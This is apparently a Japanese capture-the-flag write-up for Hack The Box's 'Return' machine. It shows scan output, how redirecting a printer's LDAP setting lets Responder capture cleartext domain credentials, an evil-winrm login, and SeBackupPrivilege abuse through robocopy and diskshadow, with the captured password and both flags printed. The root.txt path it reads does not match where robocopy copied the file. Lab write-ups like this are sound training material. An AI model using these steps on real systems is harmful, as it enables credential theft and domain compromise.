https://app.hackthebox.com/machines/401

## STEP 1
80番がオープン
```sh
└─$ rustscan -a 10.129.84.177 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.84.177:53
Open 10.129.84.177:80
Open 10.129.84.177:88
Open 10.129.84.177:135
Open 10.129.84.177:139
Open 10.129.84.177:389
Open 10.129.84.177:445
Open 10.129.84.177:464
Open 10.129.84.177:593
Open 10.129.84.177:636
Open 10.129.84.177:3268
Open 10.129.84.177:3269
Open 10.129.84.177:5985
Open 10.129.84.177:9389
Open 10.129.84.177:47001
Open 10.129.84.177:49665
Open 10.129.84.177:49667
Open 10.129.84.177:49664
Open 10.129.84.177:49666
Open 10.129.84.177:49674
Open 10.129.84.177:49671
Open 10.129.84.177:49675
Open 10.129.84.177:49677
Open 10.129.84.177:49681
Open 10.129.84.177:49697
10.129.84.177 -> [53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49665,49667,49664,49666,49674,49671,49675,49677,49681,49697]
```


## STEP 2
80番にアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Return_01.png">  
settings.phpというページを発見、svc-printerはユーザ名？  
パスワードは非表示になっている  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Return_02.png">  
settings.phpのソースを見ても、パスワードは確認できなかった  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Return_03.png">  
ここで実際にsettings.phpの「update」をクリックし、パケットを確認  
settings.phpの「Server Address」の情報のみが送信されている  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Return_04.png">  
ここでsettings.phpの「Server Address」にkaliのipを指定して送信すると  
ldap上のsvc-printerのクレデンシャルをkali側で受信した！
```sh
└─$ sudo responder -I tun0 -v                
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.11]
    Responder IPv6             [dead:beef:4::1009]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-8VTH5NT7SRF]
    Responder Domain Name      [LWXF.LOCAL]
    Responder DCE-RPC Port     [46813]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                                                                                                                                 

[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.129.84.177
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1edFg43012!!
```
5985番ポートが開いていたので、winrmでログイン成功！  
ユーザフラグゲット
```sh
└─$ evil-winrm -u 'svc-printer' -p '1edFg43012!!' -i 10.129.84.177
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> cat ../Desktop/user.txt
7ff57babb71ca751440b3a4cf191d885
```


## STEP 3
```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /all

USER INFORMATION
----------------

User Name          SID
================== =============================================
return\svc-printer S-1-5-21-3750359090-2939318659-876128439-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
`SeBackupPrivilege`が有効になっている  
SeBackupPrivilegeは[リンク](https://learn.microsoft.com/ja-jp/windows-hardware/drivers/ifs/privileges)の通り、オブジェクトのACLをバイパスしてアクセスが可能  
ただ[リンク](https://serverfault.com/questions/980880/sebackupprivilege-but-cannot-read-all-files)でもある通り、この権限は専用のAPIを使用したプログラムでないと適用されない  
robocopyコマンドを使用すればルートフラグをゲットできるが、せっかくなのでシェルをとる
```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> robocopy "C:\Users\administrator\Desktop" "C:\Users\svc-printer\Documents\" "root.txt" /B /NFL /NDL /NJH /NJS

*Evil-WinRM* PS C:\Users\svc-printer\Documents> type C:\temp\exfil\root.txt
278a2f7f1595036f612ce6fcfce54b52
```
ローカルだと、レジストリのSAM・SYSTEMをダンプすればクレデンシャルを取得できるが  
今回はADのクレデンシャルを取得するために、レジストリ以外に`ntds.dit`を取得する必要がある  
[リンク](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)を確認する限り、ntds.ditはシステムで使用中のためSeBackupPrivilege権限でもコピーできないが、  
`vss`サービスを用いた`diskshadow`コマンドでコピーが可能  
ただリンク通りに実行してもうまくシャドーコピーできなかった
### PATH 3-1
```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe query vss

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0


*Evil-WinRM* PS C:\Users\svc-printer\Documents> diskshadow /s vss.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  PRINTER,  10/6/2025 4:43:00 PM

-> set context persistent nowriters
-> add volume c: alias raj

COM call "(*vssObject)->InitializeForBackup" failed.
```
